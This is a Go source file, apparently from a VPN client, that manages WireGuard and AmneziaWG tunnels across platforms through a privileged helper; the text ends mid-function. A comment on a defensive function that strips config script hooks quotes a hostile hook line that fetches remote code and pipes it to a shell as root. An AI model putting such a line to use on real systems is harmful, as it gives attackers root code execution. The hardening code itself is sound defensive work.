package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// WireGuardProtocol implements VPNProtocol for WireGuard connections.
// Handles BOTH vanilla WireGuard AND AmneziaWG (DPI-evasion fork) —
// the variant is detected from the .conf content at Configure() time
// via DetectVariant in awg_obfuscation.go and routed to the right
// backend (wg-quick vs awg-quick on Linux; wireguard-go vs amneziawg-go
// in-process on macOS + Windows). Server-side enrollment controls
// which variant the user gets; the client has no user-facing toggle
// (see AMNEZIAWG_CLIENT_PLAN.md §1).
type WireGuardProtocol struct {
	confPath    string
	ifaceName   string
	// variant: "wireguard" (default) or "amneziawg". Set by
	// Configure() based on content detection; consulted by
	// IsAvailable/Up/Down/Status. Empty == vanilla, treated same as
	// "wireguard".
	variant     string
	connectedAt time.Time
	serverAddr  string
	localAddr   string
}

// NewWireGuardProtocol creates a new WireGuard protocol handler
func NewWireGuardProtocol() *WireGuardProtocol {
	return &WireGuardProtocol{
		confPath:  filepath.Join(appDataDir(), "privycs0.conf"),
		ifaceName: "privycs0",
	}
}

func (w *WireGuardProtocol) Name() string { return "wireguard" }

func (w *WireGuardProtocol) IsAvailable() bool {
	if runtime.GOOS == "windows" {
		// Windows AmneziaWG path is in-process via amneziawg-go (linked
		// into this same binary); no external wireguard.exe needed
		// for AWG. Vanilla WG keeps the wireguard.exe tunnel-service
		// requirement.
		if w.variant == VariantAmnezia {
			return true
		}
		for _, p := range []string{
			`C:\Program Files\WireGuard\wireguard.exe`,
			`C:\Program Files (x86)\WireGuard\wireguard.exe`,
		} {
			if _, err := os.Stat(p); err == nil {
				return true
			}
		}
		_, err := exec.LookPath("wireguard.exe")
		return err == nil
	}
	if runtime.GOOS == "darwin" {
		// macOS path is in-process for BOTH variants — wireguard-go
		// statically linked for vanilla, amneziawg-go statically
		// linked for AWG. Always available.
		return true
	}
	// Linux: search for the right userland CLI for the active variant.
	// awg-quick if AmneziaWG; wg-quick for vanilla.
	bin := "wg-quick"
	if w.variant == VariantAmnezia {
		bin = "awg-quick"
	}
	return findWGBinary(bin) != ""
}

func (w *WireGuardProtocol) Up(ctx context.Context) error {
	if runtime.GOOS == "windows" {
		return w.upWindows(ctx)
	}
	return w.upUnix(ctx)
}

func (w *WireGuardProtocol) Down(ctx context.Context) error {
	if runtime.GOOS == "windows" {
		return w.downWindows(ctx)
	}
	return w.downUnix(ctx)
}

func (w *WireGuardProtocol) Status() ProtocolStatus {
	// Variant flows from Configure() through Status() so the UI knows
	// to show the "Obfuscation: AmneziaWG" badge. Empty here = vanilla.
	variantOut := w.variant
	if variantOut == "" {
		variantOut = VariantWireGuard
	}
	status := ProtocolStatus{
		Protocol:      "wireguard",
		Variant:       variantOut,
		ServerAddress: w.serverAddr,
		LocalAddress:  w.localAddr,
	}

	if runtime.GOOS == "windows" && w.variant != VariantAmnezia {
		// Vanilla WG on Windows: check the wireguard.exe tunnel
		// service. sc query does NOT require admin privileges.
		// AWG on Windows is in-process so it falls through to the
		// helper-query path below (same as macOS).
		svcName := "WireGuardTunnel$" + w.ifaceName
		out, err := execHidden("sc", "query", svcName).CombinedOutput()
		if err == nil && strings.Contains(string(out), "RUNNING") {
			status.Connected = true
			status.BytesRx, status.BytesTx = getWindowsTrafficStats(w.ifaceName)
		}
	} else {
		// Linux/macOS (and Windows-AWG): query tunnel state via the
		// privileged helper. No direct sudo — that would prompt every
		// 2s during status polls. Variant flows through Args so the
		// helper can pick the right backend (vanilla wg vs AWG).
		client := NewHelperClient()
		if !client.IsHelperReachable() {
			return status
		}
		resp, err := client.SendCommand("status", map[string]string{
			"protocol":  "wireguard",
			"interface": w.ifaceName,
			"variant":   variantOut,
		})
		if err == nil && resp.Success && len(resp.Output) > 0 {
			status.Connected = true
			w.parseWgShowOutput(resp.Output, &status)
			// v0.9.15.45: AWG on Windows runs in amneziawg-windows'
			// per-tunnel SCM service which owns its own UAPI pipe.
			// Our helper status path now returns only "running"
			// (since v0.9.15.44 fix where the empty-vs-uapi-dump
			// response was breaking app's connected-state detection)
			// — that path no longer carries rx/tx bytes. Fall back
			// to the same per-interface counter source the vanilla
			// WG branch uses: GetIfEntry2 via getWindowsTrafficStats,
			// indexed by the wintun adapter name.
			if runtime.GOOS == "windows" && w.variant == VariantAmnezia {
				if rx, tx := getWindowsTrafficStats(w.ifaceName); rx > 0 || tx > 0 {
					status.BytesRx = rx
					status.BytesTx = tx
				}
			}
		}
	}

	if status.Connected && !w.connectedAt.IsZero() {
		status.ConnectedAt = w.connectedAt.Format(time.RFC3339)
	}

	return status
}

// LatestHandshake returns the timestamp of the most recent peer
// handshake on this tunnel, or zero time if no handshake has happened
// yet (or the tunnel is not up). Used by the rotator's post-connect
// health check (B): if 5s after Up the handshake is still zero, the
// remote endpoint is dead and we mark the member unreachable.
//
// Goes through the privileged helper because `wg show` requires
// CAP_NET_ADMIN on Linux. On Windows wg.exe runs unprivileged for
// reading state, but we use the same path for consistency.
func (w *WireGuardProtocol) LatestHandshake() time.Time {
	if w.ifaceName == "" {
		return time.Time{}
	}
	client := NewHelperClient()
	if !client.IsHelperReachable() {
		return time.Time{}
	}
	variant := w.variant
	if variant == "" {
		variant = VariantWireGuard
	}
	resp, err := client.SendCommand("wg_handshake", map[string]string{
		"interface": w.ifaceName,
		"variant":   variant,
	})
	if err != nil || !resp.Success {
		return time.Time{}
	}
	var ts int64
	if _, err := fmt.Sscan(strings.TrimSpace(resp.Output), &ts); err != nil {
		return time.Time{}
	}
	if ts == 0 {
		return time.Time{}
	}
	return time.Unix(ts, 0)
}

// SetTunnelName sets the tunnel/interface name and updates the config file path.
// On Windows, the WireGuard tunnel service name is derived from the config filename.
func (w *WireGuardProtocol) SetTunnelName(name string) {
	if name == "" {
		return
	}
	w.ifaceName = name
	w.confPath = filepath.Join(appDataDir(), name+".conf")
}

func (w *WireGuardProtocol) Configure(cfg []byte) error {
	// Forensic logging - user reported "Connect doesn't work" with
	// logs ending at "WG split tunnel applied" and no further line.
	// One of these steps is hanging on the user's machine; logs
	// pinpoint which.
	log.Printf("WireGuard.Configure: enter (confPath=%s, cfg=%d bytes)", w.confPath, len(cfg))

	// v0.9.15.x AmneziaWG — variant detection. If the conf carries
	// any AWG-specific [Interface] key (Jc, Jmin, Jmax, S1-4, H1-4,
	// I1-5), route Up/Down through the AWG backend. Vanilla wg-quick
	// and wireguard-go reject these unknown keys with a parse error
	// at tunnel-start time, so detection MUST happen here before the
	// conf hits any parser. See awg_obfuscation.go DetectVariant.
	w.variant = DetectVariant(string(cfg))
	log.Printf("WireGuard.Configure: variant=%s", w.variant)

	// v0.9.15.28: variant-aware conf-file separation. AWG configs
	// land in <name>-amneziawg.conf so they cannot clobber an
	// existing vanilla <name>.conf on disk (same connection name
	// can carry both protocols). Vanilla WG keeps its historical
	// <name>.conf path so the Windows tunnel-service name
	// (WireGuardTunnel$<name>) stays stable across releases.
	// ifaceName is decoupled below — both variants share the same
	// interface identity since only one tunnel per connection is
	// ever up at a time.
	if w.variant == VariantAmnezia {
		base := strings.TrimSuffix(w.confPath, ".conf")
		if !strings.HasSuffix(base, "-amneziawg") {
			w.confPath = base + "-amneziawg.conf"
		}
	}

	// Ensure directory exists
	if err := os.MkdirAll(filepath.Dir(w.confPath), 0700); err != nil {
		log.Printf("WireGuard.Configure: MkdirAll FAILED: %v", err)
		return fmt.Errorf("failed to create WireGuard config dir: %w", err)
	}
	log.Printf("WireGuard.Configure: MkdirAll ok")

	if err := EncryptedWriteFile(w.confPath, cfg, 0600); err != nil {
		log.Printf("WireGuard.Configure: WriteFile FAILED: %v", err)
		return fmt.Errorf("failed to write WireGuard config: %w", err)
	}
	log.Printf("WireGuard.Configure: WriteFile ok")

	// Derive interface name from config filename with the variant
	// suffix STRIPPED — this determines the Windows tunnel-service
	// name (WireGuardTunnel$<ifaceName>), the wintun adapter name
	// for in-process AWG, and the Linux/macOS wg-quick interface
	// name. Same name regardless of variant so a connection's
	// identity stays stable across protocol switches.
	base := strings.TrimSuffix(filepath.Base(w.confPath), ".conf")
	base = strings.TrimSuffix(base, "-amneziawg")
	w.ifaceName = base

	// Parse config for status display
	w.parseConfFile(string(cfg))

	log.Printf("WireGuard config written to %s (tunnel: %s)", w.confPath, w.ifaceName)
	return nil
}

// AdoptExistingConfig binds the protocol handler to a .conf file
// that already exists on disk - no file write. Used by pool
// pre-warm: the next-slot's .conf was written 60 s before
// rotation, so at rotation time we just point the handler at it
// and call Up. Skips the redundant write that Configure would
// otherwise do with identical content.
func (w *WireGuardProtocol) AdoptExistingConfig() error {
	if w.confPath == "" {
		return fmt.Errorf("AdoptExistingConfig: confPath not set (call setTunnelName first)")
	}
	content, err := EncryptedReadFile(w.confPath)
	if err != nil {
		return fmt.Errorf("AdoptExistingConfig: read %s: %w", w.confPath, err)
	}
	w.ifaceName = strings.TrimSuffix(filepath.Base(w.confPath), ".conf")
	w.parseConfFile(string(content))
	log.Printf("WireGuard config adopted from %s (tunnel: %s)", w.confPath, w.ifaceName)
	return nil
}

// ============================================================================
// Unix (Linux/macOS) — wg-quick
// ============================================================================

func (w *WireGuardProtocol) upUnix(ctx context.Context) error {
	// Inject endpoint bypass routes into the local config. The helper will copy
	// this file to /etc/wireguard/<iface>.conf with the proper permissions.
	enhanced, err := buildWGConfigWithBypass(w.confPath)
	if err != nil {
		return fmt.Errorf("failed to prepare config: %w", err)
	}

	client := NewHelperClient()
	if !client.IsHelperReachable() {
		return fmt.Errorf("privileged helper not running — install it in Settings → Privileged Helper")
	}

	// Install the enhanced config into /etc/wireguard or
	// /etc/amnezia/amneziawg via the helper, depending on variant.
	installResp, err := client.SendCommand("wg_install_config", map[string]string{
		"interface": w.ifaceName,
		"content":   enhanced,
		"variant":   w.variant,
	})
	if err != nil {
		return fmt.Errorf("helper install failed: %w", err)
	}
	if !installResp.Success {
		return fmt.Errorf("config install failed: %s", installResp.Error)
	}

	toolLabel := "wg-quick"
	if w.variant == VariantAmnezia {
		toolLabel = "awg-quick (amneziawg)"
	}
	log.Printf("Using privileged helper for %s up %s", toolLabel, w.ifaceName)
	resp, err := client.SendCommand("connect", map[string]string{
		"protocol":  "wireguard",
		"interface": w.ifaceName,
		// v0.9.15.x AWG — variant passed to helper so it picks the
		// matching userland (awg-quick on Linux; in-process
		// amneziawg-go on macOS + Windows).
		"variant": w.variant,
	})
	if err != nil {
		log.Printf("WireGuard.upUnix: helper IPC FAILED: %v", err)
		return fmt.Errorf("helper connect failed: %w", err)
	}
	if !resp.Success {
		log.Printf("WireGuard.upUnix: %s up FAILED. helper.Error=%q helper.Output=%q", toolLabel, resp.Error, resp.Output)
		return fmt.Errorf("%s up failed: %s", toolLabel, resp.Error)
	}
	w.connectedAt = time.Now()
	// Log the wg-quick stdout/stderr even on success — exit-0 from
	// wg-quick does NOT mean every step succeeded; some steps swallow
	// errors with `|| true` (route additions, network DNS swap),
	// which means the tunnel may be half-up despite "success". User
	// reported on v0.9.14.25 the helper said success but `wg show`
	// returned "not connected" continuously; without the wg-quick
	// output we couldn't tell which sub-step bombed.
	if strings.TrimSpace(resp.Output) != "" {
		log.Printf("WireGuard.upUnix: wg-quick stdout/stderr:\n%s", strings.TrimSpace(resp.Output))
	}
	log.Printf("WireGuard connected via helper (interface: %s)", w.ifaceName)
	return nil
}

func (w *WireGuardProtocol) downUnix(ctx context.Context) error {
	client := NewHelperClient()
	if !client.IsHelperReachable() {
		return fmt.Errorf("privileged helper not running — install it in Settings → Privileged Helper")
	}
	toolLabel := "wg-quick"
	if w.variant == VariantAmnezia {
		toolLabel = "awg-quick (amneziawg)"
	}
	log.Printf("Using privileged helper for %s down %s", toolLabel, w.ifaceName)
	resp, err := client.SendCommand("disconnect", map[string]string{
		"protocol":  "wireguard",
		"interface": w.ifaceName,
		"variant":   w.variant,
	})
	if err != nil {
		return fmt.Errorf("helper disconnect failed: %w", err)
	}
	if !resp.Success {
		return fmt.Errorf("wg-quick down failed: %s", resp.Error)
	}
	w.connectedAt = time.Time{}
	log.Printf("WireGuard disconnected via helper")
	return nil
}

// stripWGScriptHooks removes any wg-quick script-hook directives
// (PreUp/PostUp/PreDown/PostDown) from a WireGuard config. wg-quick runs these
// as shell commands as ROOT, so an imported/untrusted .conf carrying e.g.
// `PostUp = curl evil | sh` is a local root-RCE primitive. We strip them before
// the config reaches the privileged helper; the app re-adds only its own
// controlled bypass-route hooks afterwards. Match is on the directive key at
// line start (case-insensitive) followed by '=' so legitimate keys are
// untouched. Returns the cleaned config and the number of hook lines removed.
func stripWGScriptHooks(content string) (string, int) {
	hooks := []string{"preup", "postup", "predown", "postdown"}
	lines := strings.Split(content, "\n")
	out := make([]string, 0, len(lines))
	removed := 0
	for _, line := range lines {
		lower := strings.ToLower(strings.TrimSpace(line))
		isHook := false
		for _, h := range hooks {
			if strings.HasPrefix(lower, h) && strings.HasPrefix(strings.TrimSpace(lower[len(h):]), "=") {
				isHook = true
				break
			}
		}
		if isHook {
			removed++
			continue
		}
		out = append(out, line)
	}
	return strings.Join(out, "\n"), removed
}

// buildWGConfigWithBypass reads the WireGuard config from src and returns the
// content. On Linux/macOS it injects PostUp/PreDown endpoint bypass routes —
// when AllowedIPs covers the VPN server's own IP, traffic to the server would
// otherwise loop through the tunnel and break the connection.
//
// On Windows this is a pure pass-through: the WireGuard Windows tunnel
// service (using Wintun) automatically excludes the endpoint IP from the
// tunnel routes, so no manual PostUp is needed. Injecting the Linux
// "PostUp = ip route add ... $(ip route show default | sed ...)" lines on
// Windows would make the tunnel service fail at start because cmd.exe can't
// execute bash syntax — resulting in WireGuard's "check your config and
// network" error.
//
// This function does NOT write to /etc/wireguard or %PROGRAMDATA% — the
// privileged helper handles that via the wg_install_config action.
func buildWGConfigWithBypass(src string) (string, error) {
	data, err := EncryptedReadFile(src)
	if err != nil {
		return "", err
	}

	// SECURITY (audit blocker #1): strip any caller-supplied wg-quick script
	// hooks (PreUp/PostUp/PreDown/PostDown) before the config is ever handed to
	// the privileged helper / wg-quick, which executes them as ROOT. Imported
	// .conf files are untrusted (a malicious PostUp = arbitrary root command);
	// only our own bypass-route hooks injected below may run. wg-quick is the
	// only hook-executing path (the macOS in-process UAPI in wg_macos.go and the
	// WireGuard Windows service ignore these directives) — but we strip on every
	// path for defence in depth.
	content, stripped := stripWGScriptHooks(string(data))
	if stripped > 0 {
		log.Printf("wg config: stripped %d caller-supplied script hook(s) (PreUp/PostUp/PreDown/PostDown) — not allowed from imported configs (root-exec risk)", stripped)
	}

	// Windows: no app bypass routes needed (Wintun excludes the endpoint
	// automatically); return the hook-stripped content as-is.
	if runtime.GOOS == "windows" {
		return content, nil
	}

	endpointIP, endpointIPv6 := parseEndpointIPs(content)

	if endpointIP != "" && !strings.Contains(content, endpointIP+"/32") {
		var bypassRules string
		switch runtime.GOOS {
		case "darwin":
			// macOS: use BSD `route` instead of Linux `ip route`. Without
			// this bypass route, the WG client's UDP packets to the server
			// would match the 0.0.0.0/1 tunnel route and loop back into the
			// tunnel that's still trying to handshake — Henne-Ei-Deadlock,
			// no handshake ever completes, tunnel reports "connected" but
			// routes 0 bytes. (User-reported on v0.9.14.23: tunnel up,
			// handshake never happens, log shows "ip: Kommando nicht
			// gefunden" because the Linux command isn't on macOS.)
			//
			// Subshell awks the IPv4 default gateway from `route -n get
			// default`. Quoting `'$2'` inside an outer single-quoted shell
			// string requires escape-then-reopen: '"'"'$2'"'"' (close,
			// double-quoted single, reopen). PostUp/PreDown are written
			// to /etc/wireguard/<iface>.conf which wg-quick reads as
			// /bin/bash, so bash $() and awk are both available.
			//
			// IPv6 endpoint bypass is NOT injected here — wg-quick on
			// macOS adds it automatically when AllowedIPs covers ::/0
			// (visible in the user's wg-quick output as `route -q -n
			// add -inet6 <endpoint-v6> -gateway <fe80::...%en0>`).
			// Adding our own would conflict with wg-quick's.
			bypassRules = fmt.Sprintf(
				"PostUp = route -q -n add -inet %s/32 -gateway $(route -n get default 2>/dev/null | awk '/gateway:/ {print $2}') || true\n"+
					"PreDown = route -q -n delete -inet %s/32 || true\n",
				endpointIP, endpointIP)
		default:
			// Linux: keep existing iproute2 behaviour. The `ip route show
			// default | sed 's/default//'` trick captures gateway+device
			// in one go, then prepends a /32 host route that beats the
			// 0.0.0.0/1 tunnel route by being more specific.
			bypassRules = fmt.Sprintf(
				"PostUp = ip route add %s/32 $(ip route show default | sed 's/default//') || true\n"+
					"PreDown = ip route del %s/32 || true\n",
				endpointIP, endpointIP)
			if endpointIPv6 != "" {
				bypassRules += fmt.Sprintf(
					"PostUp = ip -6 route add %s/128 $(ip -6 route show default | sed 's/default//') || true\n"+
						"PreDown = ip -6 route del %s/128 || true\n",
					endpointIPv6, endpointIPv6)
			}
		}

		peerIdx := strings.Index(content, "[Peer]")
		if peerIdx > 0 {
			content = content[:peerIdx] + bypassRules + "\n" + content[peerIdx:]
			log.Printf("Injected endpoint bypass routes for %s (IPv6: %s) [%s syntax]", endpointIP, endpointIPv6, runtime.GOOS)
		}
	}

	return content, nil
}

// parseEndpointIPs extracts the IPv4 and IPv6 addresses of the VPN server
// from the Endpoint line in the [Peer] section.
// Endpoint can be: "1.2.3.4:51820", "[2a01::1]:51820", or "hostname:51820"
func parseEndpointIPs(config string) (ipv4, ipv6 string) {
	for _, line := range strings.Split(config, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "Endpoint") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		endpoint := strings.TrimSpace(parts[1])

		// Extract host part (remove port)
		var host string
		if strings.HasPrefix(endpoint, "[") {
			// IPv6: [2a01::1]:51820
			bracketEnd := strings.Index(endpoint, "]")
			if bracketEnd > 0 {
				host = endpoint[1:bracketEnd]
			}
		} else {
			// IPv4 or hostname: 1.2.3.4:51820 or host.example.com:51820
			colonIdx := strings.LastIndex(endpoint, ":")
			if colonIdx > 0 {
				host = endpoint[:colonIdx]
			} else {
				host = endpoint
			}
		}

		if host == "" {
			continue
		}

		// Always resolve to get BOTH IPv4 and IPv6 addresses.
		// Even if Endpoint is an IPv4 literal, the server likely also has an IPv6.
		// WireGuard or the OS may prefer IPv6, so we need bypass routes for both.
		ip := net.ParseIP(host)
		if ip != nil {
			if ip.To4() != nil {
				ipv4 = host
			} else {
				ipv6 = host
			}
			// For IP literals, do reverse lookup to find the hostname, then resolve for both families
			names, _ := net.LookupAddr(host)
			for _, name := range names {
				name = strings.TrimSuffix(name, ".")
				addrs, err := net.LookupHost(name)
				if err != nil {
					continue
				}
				for _, addr := range addrs {
					resolved := net.ParseIP(addr)
					if resolved == nil {
						continue
					}
					if resolved.To4() != nil && ipv4 == "" {
						ipv4 = addr
					} else if resolved.To4() == nil && ipv6 == "" {
						ipv6 = addr
					}
				}
				if ipv4 != "" && ipv6 != "" {
					break
				}
			}
		} else {
			// It's a hostname — resolve it directly
			addrs, err := net.LookupHost(host)
			if err != nil {
				log.Printf("Failed to resolve endpoint hostname %s: %v", host, err)
				continue
			}
			for _, addr := range addrs {
				resolved := net.ParseIP(addr)
				if resolved == nil {
					continue
				}
				if resolved.To4() != nil && ipv4 == "" {
					ipv4 = addr
				} else if resolved.To4() == nil && ipv6 == "" {
					ipv6 = addr
				}
			}
		}
		break
	}
	return ipv4, ipv6
}

// ============================================================================
// Windows — wireguard.exe /installtunnelservice
// ============================================================================

func (w *WireGuardProtocol) upWindows(ctx context.Context) error {
	// AWG runs in-process via amneziawg-go on Windows — no external
	// wireguard.exe needed. Vanilla WG still depends on it.
	if w.variant != VariantAmnezia {
		if findWireGuardExe() == "" {
			return fmt.Errorf("wireguard.exe not found")
		}
	}

	enhanced, err := buildWGConfigWithBypass(w.confPath)
	if err != nil {
		return fmt.Errorf("failed to prepare config: %w", err)
	}

	client := NewHelperClient()
	if client.IsHelperReachable() {
		// Helper-based path: no UAC prompt per connect.
		log.Printf("Starting WireGuard tunnel %s via privileged helper", w.ifaceName)
		installResp, err := client.SendCommand("wg_install_config", map[string]string{
			"interface": w.ifaceName,
			"content":   enhanced,
			"variant":   w.variant,
		})
		if err != nil {
			return fmt.Errorf("helper install failed: %w", err)
		}
		if !installResp.Success {
			return fmt.Errorf("wg config install failed: %s", installResp.Error)
		}
		resp, err := client.SendCommand("connect", map[string]string{
			"protocol":  "wireguard",
			"interface": w.ifaceName,
			"variant":   w.variant,
		})
		if err != nil {
			return fmt.Errorf("helper connect failed: %w", err)
		}
		if !resp.Success {
			return fmt.Errorf("installtunnelservice failed: %s", resp.Error)
		}
		// For vanilla WG, fast-fail by polling the WireGuardTunnel$
		// service into RUNNING state (v0.9.14.6 fix). For AWG-on-
		// Windows there is no service — the helper's connectWireGuard
		// path completes synchronously once wgWindowsUpAwg returns,
		// so we skip the service-state wait.
		if w.variant != VariantAmnezia {
			if err := waitForWGService(w.ifaceName); err != nil {
				log.Printf("WireGuard service wait: %v - failing Up()", err)
				return fmt.Errorf("wg service did not start: %w", err)
			}
		}
		w.connectedAt = time.Now()
		log.Printf("WireGuard connected via helper (variant: %s)", w.variant)
		return nil
	}

	// AmneziaWG on Windows is in-process via amneziawg-go linked into
	// the HELPER binary (Wintun + netsh routes require SYSTEM
	// privileges, the user-context app process can't install them).
	// No wireguard.exe equivalent exists for AWG. So if the helper
	// isn't running we MUST fail loudly here — the UAC fallback below
	// would silently call vanilla `wireguard.exe /installtunnelservice`,
	// which strips the AWG obfuscation keys (Jc/Jmin/Jmax/S1-4/H1-4/
	// I1-5) and produces a vanilla WG handshake. On an AWG-configured
	// server that either fails entirely OR matches a different peer
	// entry, surfacing as "wrong IP / wrong protocol" to the user.
	// v0.9.15.x history: silent fallback was the cause of the user-
	// reported "still vanilla and wrong IP .1 instead of .2" after
	// they forgot to start the privileged helper service.
	if w.variant == VariantAmnezia {
		return fmt.Errorf("AmneziaWG on Windows requires the privileged helper service — install it via Settings → Privileged Helper, or run `sc start PrivycsVpnHelper` from an admin PowerShell. Vanilla wireguard.exe cannot run AWG obfuscation")
	}

	// Fallback: direct UAC-elevated installtunnelservice (user sees UAC each connect).
	log.Printf("Starting WireGuard tunnel %s via UAC fallback (install privileged helper to eliminate prompts)", w.ifaceName)
	wgExe := findWireGuardExe()
	psScript := fmt.Sprintf(
		`Start-Process -FilePath '%s' -ArgumentList '/installtunnelservice',('%s') -Verb RunAs -Wait -WindowStyle Hidden`,
		wgExe, w.confPath,
	)
	cmd := execHiddenContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("wireguard start failed: %s: %w", string(out), err)
	}
	// v0.9.14.6: same fast-fail propagation as the helper path.
	if err := waitForWGService(w.ifaceName); err != nil {
		log.Printf("WireGuard service wait: %v - failing Up()", err)
		return fmt.Errorf("wg service did not start: %w", err)
	}
	w.connectedAt = time.Now()
	return nil
}

func (w *WireGuardProtocol) downWindows(ctx context.Context) error {
	// AWG on Windows is in-process — no wireguard.exe, no WireGuard
	// tunnel-service. Jump straight to the helper which calls
	// wgWindowsDownAwg to tear down the in-process device + Wintun.
	if w.variant == VariantAmnezia {
		client := NewHelperClient()
		if !client.IsHelperReachable() {
			return fmt.Errorf("privileged helper not running — cannot tear down in-process AmneziaWG tunnel")
		}
		log.Printf("Stopping AmneziaWG tunnel %s via privileged helper (in-process)", w.ifaceName)
		resp, err := client.SendCommand("disconnect", map[string]string{
			"protocol":  "wireguard",
			"interface": w.ifaceName,
			"variant":   w.variant,
		})
		if err != nil {
			log.Printf("helper disconnect (AWG): %v", err)
		} else if !resp.Success {
			log.Printf("helper disconnect (AWG) reported: %s", resp.Error)
		}
		w.connectedAt = time.Time{}
		return nil
	}

	if findWireGuardExe() == "" {
		return fmt.Errorf("wireguard.exe not found")
	}

	// Pre-check: is a WireGuard tunnel actually running RIGHT NOW?
	// sc query is admin-free and returns immediately. We only run
	// the disconnect dance when there is a service in RUNNING state.
	// The two cases this skips:
	//
	//   - Service does not exist (sc returns 1060): nothing to do.
	//   - Service exists but is STOPPED / START_PENDING / STOP_PENDING:
	//     no live tunnel; an orphan service is left alone and gets
	//     cleaned up on the next genuine connect (which calls
	//     uninstalltunnelservice as part of its prep).
	//
	// Without this check, the UAC fallback below was firing every
	// time the user clicked Tray Quit while the in-memory
	// a.connected flag was stale (e.g. user manually stopped the
	// privileged helper service, the tunnel had since died, but the
	// app still thought it was connected). User reported exactly
	// this: "Quit asks for UAC even though no tunnel is active".
	svcName := "WireGuardTunnel$" + w.ifaceName
	out, _ := execHidden("sc", "query", svcName).CombinedOutput()
	if !strings.Contains(string(out), "RUNNING") {
		log.Printf("WireGuard down: %s not running (state=%q), skipping disconnect",
			svcName, strings.TrimSpace(string(out)))
		w.connectedAt = time.Time{}
		return nil
	}

	client := NewHelperClient()
	if client.IsHelperReachable() {
		log.Printf("Stopping WireGuard tunnel %s via privileged helper", w.ifaceName)
		resp, err := client.SendCommand("disconnect", map[string]string{
			"protocol":  "wireguard",
			"interface": w.ifaceName,
			"variant":   w.variant,
		})
		if err != nil {
			log.Printf("helper disconnect: %v", err)
		} else if !resp.Success {
			log.Printf("helper disconnect reported: %s", resp.Error)
		}
		w.connectedAt = time.Time{}
		return nil
	}

	// Helper unreachable AND service is running. Previously this fell
	// through to a `Start-Process -Verb RunAs` UAC prompt to invoke
	// wireguard.exe /uninstalltunnelservice directly. The UAC prompt
	// has been removed because:
	//
	//   1. It fired during Tray-Quit when the user just wanted to
	//      shut the app down - asking for admin rights at exit is
	//      hostile UX.
	//   2. The helper service is the supported privileged path; if
	//      it is unreachable something has gone wrong with the
	//      installation and the user should restart / reinstall the
	//      helper rather than be repeatedly prompted.
	//
	// Returns an explicit error so the caller (app.go Disconnect /
	// Quit handler) can decide whether to keep the in-memory
	// a.connected flag set (UI stays in sync with reality - tunnel
	// is in fact still up) or proceed regardless (Quit ignores the
	// error and exits).
	log.Printf("WireGuard down: helper unreachable; orphan service %s left in place (use EMERGENCY_RECOVERY.md for manual cleanup)", svcName)
	return fmt.Errorf("WireGuard helper unreachable; tunnel %s is still running. Restart the Privycs Helper service or reinstall to recover", svcName)
}

// waitForWGService polls for the WireGuardTunnel$<iface> Windows service to
// enter RUNNING state after installtunnelservice. Returns after ~20s max.
//
// v0.9.14.8: bumped from 7.5s to 20s. v0.9.14.6's fast-fail propagation
// of the wait error to Up() exposed slow-start cases (Mullvad configs
// with 49 AllowedIPs entries take 8-15s on some Windows setups for the
// kernel to install all routes before the service reports RUNNING).
// The previous 7.5s window was too aggressive — slow but healthy
// services failed Up() and the user saw "app says disconnected, tunnel
// is up, traffic flows" because the service eventually came up after
// we had already given up. 20s catches the realistic worst case while
// still failing dead services within bounded time. Connect's outer
// status-poll then double-confirms.
//
// Polls every 500ms; logs progress every 5s so a stuck-in-START_PENDING
// service is visible in the log instead of appearing silent.
func waitForWGService(ifaceName string) error {
	svcName := "WireGuardTunnel$" + ifaceName
	const maxIterations = 40 // 40 * 500ms = 20s
	for i := 0; i < maxIterations; i++ {
		time.Sleep(500 * time.Millisecond)
		out, err := execHidden("sc", "query", svcName).CombinedOutput()
		if err == nil && strings.Contains(string(out), "RUNNING") {
			if i >= 15 {
				log.Printf("WireGuard service %s entered RUNNING after %dms (slow-start, but healthy)",
					svcName, (i+1)*500)
			}
			return nil
		}
		// Progress beat every 5s so the user-facing log shows
		// the service IS being polled, not that we hung.
		if (i+1)%10 == 0 {
			log.Printf("WireGuard service %s wait: %dms elapsed, still not RUNNING", svcName, (i+1)*500)
		}
	}
	return fmt.Errorf("service %s did not enter RUNNING state within 20s", svcName)
}

// findWireGuardExe locates the WireGuard executable on Windows
func findWireGuardExe() string {
	paths := []string{
		`C:\Program Files\WireGuard\wireguard.exe`,
		`C:\Program Files (x86)\WireGuard\wireguard.exe`,
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	// Try PATH
	if p, err := exec.LookPath("wireguard.exe"); err == nil {
		return p
	}
	return ""
}

// wgExecEnv returns an environment slice suitable for spawning a
// WireGuard userland binary (or wg-quick, which is a shell script that
// internally invokes wg/ip/pfctl/sysctl/etc. by bare name). Prepends
// the standard Homebrew prefixes plus /sbin and /usr/sbin to PATH so
// the launchd-spawned helper can locate every dependency wg-quick
// touches even when its inherited PATH is the minimal launchd default.
// Caller does cmd.Env = wgExecEnv() before exec.
func wgExecEnv() []string {
	const prepend = "/opt/homebrew/bin:/usr/local/bin:/usr/sbin:/sbin"
	env := os.Environ()
	for i, kv := range env {
		if strings.HasPrefix(kv, "PATH=") {
			env[i] = "PATH=" + prepend + ":" + kv[5:]
			return env
		}
	}
	return append(env, "PATH="+prepend+":/usr/bin:/bin")
}

// findWGBinary returns the absolute path to a WireGuard userland binary
// ("wg" or "wg-quick") on Linux/macOS, or empty if not installed.
//
// macOS GUI-launched apps get launchd's minimal PATH (/usr/bin:/bin:
// /usr/sbin:/sbin) — Homebrew installs (/opt/homebrew/bin on Apple
// Silicon, /usr/local/bin on Intel) are NOT in that PATH, so a plain
// exec.LookPath fails even though the user has wireguard-tools
// installed and reachable from a terminal. Same problem affects the
// privileged helper which runs as root via launchd: launchd-spawned
// daemons inherit a similarly minimal PATH.
//
// Search order: explicit Homebrew paths first (cheap stat, deterministic
// even when PATH is unset), then PATH fallback for nonstandard installs
// or when the user launches from a terminal that has Homebrew in PATH.
func findWGBinary(name string) string {
	candidates := []string{
		"/opt/homebrew/bin/" + name, // Apple Silicon Homebrew
		"/usr/local/bin/" + name,    // Intel Homebrew, MacPorts, manual installs
		"/usr/bin/" + name,          // distro-packaged on Linux
		"/sbin/" + name,             // some Linux distros
	}
	for _, p := range candidates {
